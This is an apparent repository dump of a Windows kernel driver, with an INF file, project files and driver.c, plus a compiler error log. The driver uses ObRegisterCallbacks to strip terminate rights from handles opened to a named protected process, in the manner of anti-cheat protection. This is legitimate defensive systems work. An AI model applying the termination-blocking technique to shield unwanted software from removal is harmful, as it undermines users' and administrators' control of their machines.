c:\users\marius\git\memwars\anticheatmethods\obregistercallbacksdriver\obregistercallbacksdriver\obregistercallbacksdriver\driver.cpp(307): error C3861: "TdDeleteProtectNameCallback": Bezeichner wurde nicht gefunden.
c:\users\marius\git\memwars\anticheatmethods\obregistercallbacksdriver\obregistercallbacksdriver\obregistercallbacksdriver\driver.cpp(354): error C3861: "TdDeleteProtectNameCallback": Bezeichner wurde nicht gefunden.

```

`AntiCheatMethods/ObRegisterCallbacksDriver/ObRegisterCallbacksDriver/ObRegisterCallbacksDriver.inf`:

```inf
;
; ObRegisterCallbacksDriver.inf
;

[Version]
Signature="$WINDOWS NT$"
Class=Sample ; TODO: edit Class
ClassGuid={78A1C341-4539-11d3-B88D-00C04FAD5171} ; TODO: edit ClassGuid
Provider=%ManufacturerName%
CatalogFile=ObRegisterCallbacksDriver.cat
DriverVer= ; TODO: set DriverVer in stampinf property pages

[DestinationDirs]
DefaultDestDir = 12
ObRegisterCallbacksDriver_Device_CoInstaller_CopyFiles = 11

; ================= Class section =====================

[ClassInstall32]
Addreg=SampleClassReg

[SampleClassReg]
HKR,,,0,%ClassName%
HKR,,Icon,,-5

[SourceDisksNames]
1 = %DiskName%,,,""

[SourceDisksFiles]
ObRegisterCallbacksDriver.sys  = 1,,
WdfCoInstaller$KMDFCOINSTALLERVERSION$.dll=1 ; make sure the number matches with SourceDisksNames

;*****************************************
; Install Section
;*****************************************

[Manufacturer]
%ManufacturerName%=Standard,NT$ARCH$

[Standard.NT$ARCH$]
%ObRegisterCallbacksDriver.DeviceDesc%=ObRegisterCallbacksDriver_Device, Root\ObRegisterCallbacksDriver ; TODO: edit hw-id

[ObRegisterCallbacksDriver_Device.NT]
CopyFiles=Drivers_Dir

[Drivers_Dir]
ObRegisterCallbacksDriver.sys

;-------------- Service installation
[ObRegisterCallbacksDriver_Device.NT.Services]
AddService = ObRegisterCallbacksDriver,%SPSVCINST_ASSOCSERVICE%, ObRegisterCallbacksDriver_Service_Inst

; -------------- ObRegisterCallbacksDriver driver install sections
[ObRegisterCallbacksDriver_Service_Inst]
DisplayName    = %ObRegisterCallbacksDriver.SVCDESC%
ServiceType    = 1               ; SERVICE_KERNEL_DRIVER
StartType      = 3               ; SERVICE_DEMAND_START
ErrorControl   = 1               ; SERVICE_ERROR_NORMAL
ServiceBinary  = %12%\ObRegisterCallbacksDriver.sys

;
;--- ObRegisterCallbacksDriver_Device Coinstaller installation ------
;

[ObRegisterCallbacksDriver_Device.NT.CoInstallers]
AddReg=ObRegisterCallbacksDriver_Device_CoInstaller_AddReg
CopyFiles=ObRegisterCallbacksDriver_Device_CoInstaller_CopyFiles

[ObRegisterCallbacksDriver_Device_CoInstaller_AddReg]
HKR,,CoInstallers32,0x00010000, "WdfCoInstaller$KMDFCOINSTALLERVERSION$.dll,WdfCoInstaller"

[ObRegisterCallbacksDriver_Device_CoInstaller_CopyFiles]
WdfCoInstaller$KMDFCOINSTALLERVERSION$.dll

[ObRegisterCallbacksDriver_Device.NT.Wdf]
KmdfService =  ObRegisterCallbacksDriver, ObRegisterCallbacksDriver_wdfsect
[ObRegisterCallbacksDriver_wdfsect]
KmdfLibraryVersion = $KMDFVERSION$

[Strings]
SPSVCINST_ASSOCSERVICE= 0x00000002
ManufacturerName="<Your manufacturer name>" ;TODO: Replace with your manufacturer name
ClassName="Samples" ; TODO: edit ClassName
DiskName = "ObRegisterCallbacksDriver Installation Disk"
ObRegisterCallbacksDriver.DeviceDesc = "ObRegisterCallbacksDriver Device"
ObRegisterCallbacksDriver.SVCDESC = "ObRegisterCallbacksDriver Service"

```

`AntiCheatMethods/ObRegisterCallbacksDriver/ObRegisterCallbacksDriver/ObRegisterCallbacksDriver.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" ToolsVersion="12.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|ARM">
      <Configuration>Debug</Configuration>
      <Platform>ARM</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|ARM">
      <Configuration>Release</Configuration>
      <Platform>ARM</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|ARM64">
      <Configuration>Debug</Configuration>
      <Platform>ARM64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|ARM64">
      <Configuration>Release</Configuration>
      <Platform>ARM64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <ProjectGuid>{0443E933-8D93-4976-97D6-57ABA9017F21}</ProjectGuid>
    <TemplateGuid>{1bc93793-694f-48fe-9372-81e2b05556fd}</TemplateGuid>
    <TargetFrameworkVersion>v4.5</TargetFrameworkVersion>
    <MinimumVisualStudioVersion>12.0</MinimumVisualStudioVersion>
    <Configuration>Debug</Configuration>
    <Platform Condition="'$(Platform)' == ''">Win32</Platform>
    <RootNamespace>ObRegisterCallbacksDriver</RootNamespace>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <TargetVersion>Windows10</TargetVersion>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
    <ConfigurationType>Driver</ConfigurationType>
    <DriverType>KMDF</DriverType>
    <DriverTargetPlatform>Universal</DriverTargetPlatform>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <TargetVersion>Windows10</TargetVersion>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
    <ConfigurationType>Driver</ConfigurationType>
    <DriverType>KMDF</DriverType>
    <DriverTargetPlatform>Universal</DriverTargetPlatform>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <TargetVersion>Windows10</TargetVersion>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
    <ConfigurationType>Driver</ConfigurationType>
    <DriverType>KMDF</DriverType>
    <DriverTargetPlatform>Universal</DriverTargetPlatform>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <TargetVersion>Windows10</TargetVersion>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
    <ConfigurationType>Driver</ConfigurationType>
    <DriverType>KMDF</DriverType>
    <DriverTargetPlatform>Universal</DriverTargetPlatform>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|ARM'" Label="Configuration">
    <TargetVersion>Windows10</TargetVersion>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
    <ConfigurationType>Driver</ConfigurationType>
    <DriverType>KMDF</DriverType>
    <DriverTargetPlatform>Universal</DriverTargetPlatform>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|ARM'" Label="Configuration">
    <TargetVersion>Windows10</TargetVersion>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
    <ConfigurationType>Driver</ConfigurationType>
    <DriverType>KMDF</DriverType>
    <DriverTargetPlatform>Universal</DriverTargetPlatform>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|ARM64'" Label="Configuration">
    <TargetVersion>Windows10</TargetVersion>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
    <ConfigurationType>Driver</ConfigurationType>
    <DriverType>KMDF</DriverType>
    <DriverTargetPlatform>Universal</DriverTargetPlatform>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|ARM64'" Label="Configuration">
    <TargetVersion>Windows10</TargetVersion>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
    <ConfigurationType>Driver</ConfigurationType>
    <DriverType>KMDF</DriverType>
    <DriverTargetPlatform>Universal</DriverTargetPlatform>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="PropertySheets">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|ARM'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|ARM'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|ARM64'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|ARM64'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Link>
      <AdditionalOptions>/INTEGRITYCHECK %(AdditionalOptions)</AdditionalOptions>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <Inf Include="ObRegisterCallbacksDriver.inf" />
  </ItemGroup>
  <ItemGroup>
    <FilesToPackage Include="$(TargetPath)" />
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="driver.c" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="driver.h" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`AntiCheatMethods/ObRegisterCallbacksDriver/ObRegisterCallbacksDriver/ObRegisterCallbacksDriver.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hpp;hxx;hm;inl;inc;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
    <Filter Include="Driver Files">
      <UniqueIdentifier>{8E41214B-6785-4CFE-B992-037D68949A14}</UniqueIdentifier>
      <Extensions>inf;inv;inx;mof;mc;</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <Inf Include="ObRegisterCallbacksDriver.inf">
      <Filter>Driver Files</Filter>
    </Inf>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="driver.h">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="driver.c">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
</Project>
```

`AntiCheatMethods/ObRegisterCallbacksDriver/ObRegisterCallbacksDriver/ObRegisterCallbacksDriver.vcxproj.user`:

```user
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <RemoveDriver>False</RemoveDriver>
    <InstallMode>None</InstallMode>
    <HardwareIdString>Root\ObCallbackTest</HardwareIdString>
    <CommandLine />
    <ScriptPath>C:\Program Files (x86)\Windows Kits\10\Testing\Tests\Utilities\DefaultDriverPackageInstallationTask.dll</ScriptPath>
    <DbgengRemoteMachineName>
    </DbgengRemoteMachineName>
    <DbgengKernelMachineName>
    </DbgengKernelMachineName>
    <DeployFiles />
    <ScriptName>Microsoft.DriverKit.DefaultDriverPackageInstallationClass.PerformDefaultDriverPackageInstallation</ScriptName>
    <ScriptDeviceQuery />
  </PropertyGroup>
</Project>
```

`AntiCheatMethods/ObRegisterCallbacksDriver/ObRegisterCallbacksDriver/driver.c`:

```c

#include <ntddk.h>
#include <wdf.h>

#include "driver.h"

#define TD_DRIVER_NAME             L"ObRegisterCallbacksDriver"
#define TD_DRIVER_NAME_WITH_EXT    L"ObRegisterCallbacksDriver.sys"

#define TD_NT_DEVICE_NAME          L"\\Device\\ObCallbackTest"
#define TD_DOS_DEVICES_LINK_NAME   L"\\DosDevices\\ObCallbackTest"
#define TD_WIN32_DEVICE_NAME       L"\\\\.\\ObCallbackTest"

#define NAME_SIZE 200

#define TD_IOCTL_PROTECT_NAME_CALLBACK        CTL_CODE (FILE_DEVICE_UNKNOWN, (0x800 + 2), METHOD_BUFFERED, FILE_SPECIAL_ACCESS)
#define TD_IOCTL_UNPROTECT_CALLBACK           CTL_CODE (FILE_DEVICE_UNKNOWN, (0x800 + 3), METHOD_BUFFERED, FILE_SPECIAL_ACCESS)

#define CB_PROCESS_TERMINATE 0x0001
#define CB_THREAD_TERMINATE  0x0001

//#define TD_CALLBACK_REGISTRATION_TAG  '0bCO' // TD_CALLBACK_REGISTRATION structure.
#define TD_CALL_CONTEXT_TAG           '1bCO'

typedef struct _TD_PROTECTNAME_INPUT {
	ULONG Operation;
	WCHAR Name[NAME_SIZE + 1];      // what is the filename to protect - extra wchar for forced NULL
}
TD_PROTECTNAME_INPUT, *PTD_PROTECTNAME_INPUT;

typedef struct _TD_CALLBACK_PARAMETERS {
	ACCESS_MASK AccessBitsToClear;
	ACCESS_MASK AccessBitsToSet;
} TD_CALLBACK_PARAMETERS, *PTD_CALLBACK_PARAMETERS;

typedef struct _TD_CALLBACK_REGISTRATION {
	// Handle returned by ObRegisterCallbacks.
	PVOID RegistrationHandle;

	// If not NULL, filter only requests to open/duplicate handles to this
	// process (or one of its threads).
	PVOID TargetProcess;
	HANDLE TargetProcessId;

	// Currently each TD_CALLBACK_REGISTRATION has at most one process and one
	// thread callback. That is, we can't register more than one callback for
	// the same object type with a single ObRegisterCallbacks call.

	TD_CALLBACK_PARAMETERS ProcessParams;
	TD_CALLBACK_PARAMETERS ThreadParams;

	ULONG RegistrationId;        // Index in the global TdCallbacks array.
} TD_CALLBACK_REGISTRATION, *PTD_CALLBACK_REGISTRATION;

typedef struct _TD_CALL_CONTEXT {
	PTD_CALLBACK_REGISTRATION CallbackRegistration;

	OB_OPERATION Operation;
	PVOID Object;
	POBJECT_TYPE ObjectType;
} TD_CALL_CONTEXT, *PTD_CALL_CONTEXT;

BOOLEAN TdbProtectName = FALSE;
BOOLEAN bCallbacksInstalled = FALSE;

// Here is the protected process
WCHAR   TdwProtectName[NAME_SIZE + 1] = { 0 };
PVOID   TdProtectedTargetProcess = NULL;
HANDLE  TdProtectedTargetProcessId = { 0 };

UNICODE_STRING CBAltitude = { 0 };

PVOID pCBRegistrationHandle = NULL;
OB_CALLBACK_REGISTRATION CBObRegistration = { 0 };
TD_CALLBACK_REGISTRATION CBCallbackRegistration = { 0 };


OB_OPERATION_REGISTRATION CBOperationRegistrations[2] = { { 0 },{ 0 } };




void TdSetCallContext(_Inout_ POB_PRE_OPERATION_INFORMATION PreInfo,_In_ PTD_CALLBACK_REGISTRATION CallbackRegistration) {
	PTD_CALL_CONTEXT CallContext;

	CallContext = (PTD_CALL_CONTEXT)ExAllocatePoolWithTag(
		PagedPool, sizeof(TD_CALL_CONTEXT), TD_CALL_CONTEXT_TAG
	);

	if (CallContext == NULL) {
		return;
	}

	RtlZeroMemory(CallContext, sizeof(TD_CALL_CONTEXT));

	CallContext->CallbackRegistration = CallbackRegistration;
	CallContext->Operation = PreInfo->Operation;
	CallContext->Object = PreInfo->Object;
	CallContext->ObjectType = PreInfo->ObjectType;

	PreInfo->CallContext = CallContext;
}

void TdCheckAndFreeCallContext(_Inout_ POB_POST_OPERATION_INFORMATION PostInfo, _In_ PTD_CALLBACK_REGISTRATION CallbackRegistration) {
	PTD_CALL_CONTEXT CallContext = (PTD_CALL_CONTEXT)PostInfo->CallContext;

	if (CallContext != NULL) {
		NT_ASSERT(CallContext->CallbackRegistration == CallbackRegistration);

		NT_ASSERT(CallContext->Operation == PostInfo->Operation);
		NT_ASSERT(CallContext->Object == PostInfo->Object);
		NT_ASSERT(CallContext->ObjectType == PostInfo->ObjectType);

		ExFreePoolWithTag(CallContext, TD_CALL_CONTEXT_TAG);
	}
}

VOID CBTdPostOperationCallback(_In_ PVOID RegistrationContext, _In_ POB_POST_OPERATION_INFORMATION PostInfo) {
	PTD_CALLBACK_REGISTRATION CallbackRegistration = (PTD_CALLBACK_REGISTRATION)RegistrationContext;

	TdCheckAndFreeCallContext(PostInfo, CallbackRegistration);

	if (PostInfo->ObjectType == *PsProcessType) {
		// Ignore requests for processes other than our target process.

		if (CallbackRegistration->TargetProcess != NULL &&
			CallbackRegistration->TargetProcess != PostInfo->Object
			) {
			return;
		}

		// Also ignore requests that are trying to open/duplicate the current
		// process.

		if (PostInfo->Object == PsGetCurrentProcess()) {
			return;
		}
	}
	else if (PostInfo->ObjectType == *PsThreadType) {
		HANDLE ProcessIdOfTargetThread = PsGetThreadProcessId((PETHREAD)PostInfo->Object);

		// Ignore requests for threads belonging to processes other than our
		// target process.

		if (CallbackRegistration->TargetProcess != NULL &&
			CallbackRegistration->TargetProcessId != ProcessIdOfTargetThread
			) {
			return;
		}

		// Also ignore requests for threads belonging to the current processes.

		if (ProcessIdOfTargetThread == PsGetCurrentProcessId()) {
			return;
		}
	}
	else {
		NT_ASSERT(FALSE);
	}
}

OB_PREOP_CALLBACK_STATUS CBTdPreOperationCallback(_In_ PVOID RegistrationContext, _Inout_ POB_PRE_OPERATION_INFORMATION PreInfo) {
	PTD_CALLBACK_REGISTRATION CallbackRegistration;

	ACCESS_MASK AccessBitsToClear = 0;
	ACCESS_MASK AccessBitsToSet = 0;
	ACCESS_MASK InitialDesiredAccess = 0;
	ACCESS_MASK OriginalDesiredAccess = 0;


	PACCESS_MASK DesiredAccess = NULL;

	LPCWSTR ObjectTypeName = NULL;
	LPCWSTR OperationName = NULL;

	// Not using driver specific values at this time
	CallbackRegistration = (PTD_CALLBACK_REGISTRATION)RegistrationContext;


	NT_ASSERT(PreInfo->CallContext == NULL);

	// Only want to filter attempts to access protected process
	// all other processes are left untouched

	if (PreInfo->ObjectType == *PsProcessType) {
		// Ignore requests for processes other than our target process.

		// if (TdProtectedTargetProcess != NULL &&
		//    TdProtectedTargetProcess != PreInfo->Object)
		if (TdProtectedTargetProcess != PreInfo->Object) {
			goto Exit;
		}

		// Also ignore requests that are trying to open/duplicate the current
		// process.

		if (PreInfo->Object == PsGetCurrentProcess()) {
			DbgPrintEx(
				DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
				"ObCallbackTest: CBTdPreOperationCallback: ignore process open/duplicate from the protected process itself\n");
			goto Exit;
		}

		ObjectTypeName = L"PsProcessType";
		AccessBitsToClear = CB_PROCESS_TERMINATE;
		AccessBitsToSet = 0;
	}
	else if (PreInfo->ObjectType == *PsThreadType) {
		HANDLE ProcessIdOfTargetThread = PsGetThreadProcessId((PETHREAD)PreInfo->Object);

		// Ignore requests for threads belonging to processes other than our
		// target process.

		// if (CallbackRegistration->TargetProcess   != NULL &&
		//     CallbackRegistration->TargetProcessId != ProcessIdOfTargetThread)
		if (TdProtectedTargetProcessId != ProcessIdOfTargetThread) {
			goto Exit;
		}

		// Also ignore requests for threads belonging to the current processes.

		if (ProcessIdOfTargetThread == PsGetCurrentProcessId()) {
			DbgPrintEx(
				DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
				"ObCallbackTest: CBTdPreOperationCallback: ignore thread open/duplicate from the protected process itself\n");
			goto Exit;
		}

		ObjectTypeName = L"PsThreadType";
		AccessBitsToClear = CB_THREAD_TERMINATE;
		AccessBitsToSet = 0;
	}
	else {
		DbgPrintEx(
			DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
			"ObCallbackTest: CBTdPreOperationCallback: unexpected object type\n");
		goto Exit;
	}

	switch (PreInfo->Operation) {
	case OB_OPERATION_HANDLE_CREATE:
		DesiredAccess = &PreInfo->Parameters->CreateHandleInformation.DesiredAccess;
		OriginalDesiredAccess = PreInfo->Parameters->CreateHandleInformation.OriginalDesiredAccess;

		OperationName = L"OB_OPERATION_HANDLE_CREATE";
		break;

	case OB_OPERATION_HANDLE_DUPLICATE:
		DesiredAccess = &PreInfo->Parameters->DuplicateHandleInformation.DesiredAccess;
		OriginalDesiredAccess = PreInfo->Parameters->DuplicateHandleInformation.OriginalDesiredAccess;

		OperationName = L"OB_OPERATION_HANDLE_DUPLICATE";
		break;

	default:
		NT_ASSERT(FALSE);
		break;
	}

	InitialDesiredAccess = *DesiredAccess;

	// Filter only if request made outside of the kernel
	if (PreInfo->KernelHandle != 1) {
		*DesiredAccess &= ~AccessBitsToClear;
		*DesiredAccess |= AccessBitsToSet;
	}

	// Set call context.

	TdSetCallContext(PreInfo, CallbackRegistration);


	DbgPrintEx(
		DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "ObCallbackTest: CBTdPreOperationCallback: PROTECTED process %p (ID 0x%p)\n",
		TdProtectedTargetProcess,
		(PVOID)TdProtectedTargetProcessId
	);

	DbgPrintEx(
		DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
		"ObCallbackTest: CBTdPreOperationCallback\n"
		"    Client Id:    %p:%p\n"
		"    Object:       %p\n"
		"    Type:         %ls\n"
		"    Operation:    %ls (KernelHandle=%d)\n"
		"    OriginalDesiredAccess: 0x%x\n"
		"    DesiredAccess (in):    0x%x\n"
		"    DesiredAccess (out):   0x%x\n",
		PsGetCurrentProcessId(),
		PsGetCurrentThreadId(),
		PreInfo->Object,
		ObjectTypeName,
		OperationName,
		PreInfo->KernelHandle,
		OriginalDesiredAccess,
		InitialDesiredAccess,
		*DesiredAccess
	);

Exit:

	return OB_PREOP_SUCCESS;
}

NTSTATUS TdProtectNameCallback(_In_ PTD_PROTECTNAME_INPUT pProtectName) {
	NTSTATUS Status = STATUS_SUCCESS;

	if (!pProtectName) {
		DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,"ObCallbackTest: TdProtectNameCallback: name to protect/filter NULL pointer\n");
	}
	else {
		DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,"ObCallbackTest: TdProtectNameCallback: entering name to protect/filter %ls\n", pProtectName->Name);
	}

	// Need to copy out the name and then set the flag to filter
	// This will allow process creation to watch for the process to be created and get the PID
	// and then prevent any other process from opening up that PID to terminate

	memcpy(TdwProtectName, pProtectName->Name, sizeof(TdwProtectName));

	DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "ObCallbackTest: name copied     %ls\n", TdwProtectName);

	// Need to enable the OB callbacks
	// once the process is matched to a newly created process, the callbacks will protect the process
	if (bCallbacksInstalled == FALSE) {
		DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "ObCallbackTest: TdProtectNameCallback: installing callbacks\n");

		// Setup the Ob Registration calls

		CBOperationRegistrations[0].ObjectType = PsProcessType;
		CBOperationRegistrations[0].Operations |= OB_OPERATION_HANDLE_CREATE;
		CBOperationRegistrations[0].Operations |= OB_OPERATION_HANDLE_DUPLICATE;
		CBOperationRegistrations[0].PreOperation = CBTdPreOperationCallback;
		CBOperationRegistrations[0].PostOperation = CBTdPostOperationCallback;

		CBOperationRegistrations[1].ObjectType = PsThreadType;
		CBOperationRegistrations[1].Operations |= OB_OPERATION_HANDLE_CREATE;
		CBOperationRegistrations[1].Operations |= OB_OPERATION_HANDLE_DUPLICATE;
		CBOperationRegistrations[1].PreOperation = CBTdPreOperationCallback;
		CBOperationRegistrations[1].PostOperation = CBTdPostOperationCallback;


		RtlInitUnicodeString(&CBAltitude, L"1000");

		CBObRegistration.Version = OB_FLT_REGISTRATION_VERSION;
		CBObRegistration.OperationRegistrationCount = 2;
		CBObRegistration.Altitude = CBAltitude;
		CBObRegistration.RegistrationContext = &CBCallbackRegistration;
		CBObRegistration.OperationRegistration = CBOperationRegistrations;


		Status = ObRegisterCallbacks(
			&CBObRegistration,
			&pCBRegistrationHandle       // save the registration handle to remove callbacks later
		);

		if (!NT_SUCCESS(Status)) {
			DbgPrintEx(
				DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
				"ObCallbackTest: installing OB callbacks failed  status 0x%x\n", Status
			);
			goto Exit;
		}
		bCallbacksInstalled = TRUE;

	}

	DbgPrintEx(
		DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
		"ObCallbackTest: TdProtectNameCallback: name to protect/filter %ls\n", TdwProtectName
	);

Exit:
	DbgPrintEx(
		DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
		"ObCallbackTest: TdProtectNameCallback: exiting  status 0x%x\n", Status
	);
	return Status;
}

NTSTATUS TdDeleteProtectNameCallback() {
	NTSTATUS Status = STATUS_SUCCESS;

	DbgPrintEx(
		DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
		"ObCallbackTest: TdDeleteProtectNameCallback entering\n");


	// if the callbacks are active - remove them
	if (bCallbacksInstalled == TRUE) {
		ObUnRegisterCallbacks(pCBRegistrationHandle);
		pCBRegistrationHandle = NULL;
		bCallbacksInstalled = FALSE;
	}


	DbgPrintEx(
		DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
		"ObCallbackTest: TdDeleteProtectNameCallback exiting  - status 0x%x\n", Status
	);

	return Status;
}

VOID TdDeviceUnload(_In_ PDRIVER_OBJECT DriverObject) {
	NTSTATUS Status = STATUS_SUCCESS;
	UNICODE_STRING DosDevicesLinkName = RTL_CONSTANT_STRING(TD_DOS_DEVICES_LINK_NAME);

	DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "ObCallbackTest: TdDeviceUnload\n");

	// remove filtering and remove any OB callbacks
	Status = TdDeleteProtectNameCallback();
	NT_ASSERT(Status == STATUS_SUCCESS);

	Status = IoDeleteSymbolicLink(&DosDevicesLinkName);
	if (Status != STATUS_INSUFFICIENT_RESOURCES) {
		NT_ASSERT(NT_SUCCESS(Status));
	}
	IoDeleteDevice(DriverObject->DeviceObject);
}

NTSTATUS TdControlProtectName(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp) {
	NTSTATUS Status = STATUS_SUCCESS;
	PIO_STACK_LOCATION IrpStack = NULL;
	ULONG InputBufferLength = 0;
	PTD_PROTECTNAME_INPUT pProtectNameInput = NULL;

	UNREFERENCED_PARAMETER(DeviceObject);


	DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "ObCallbackTest: TdControlProtectName: Entering\n");

	IrpStack = IoGetCurrentIrpStackLocation(Irp);
	InputBufferLength = IrpStack->Parameters.DeviceIoControl.InputBufferLength;

	if (InputBufferLength < sizeof(TD_PROTECTNAME_INPUT)) {
		Status = STATUS_BUFFER_OVERFLOW;
		goto Exit;
	}

	pProtectNameInput = (PTD_PROTECTNAME_INPUT)Irp->AssociatedIrp.SystemBuffer;

	Status = TdProtectNameCallback(pProtectNameInput);
	TdbProtectName = TRUE;

Exit:
	DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "ObCallbackTest: TD_IOCTL_PROTECTNAME: Status %x\n", Status);

	return Status;
}

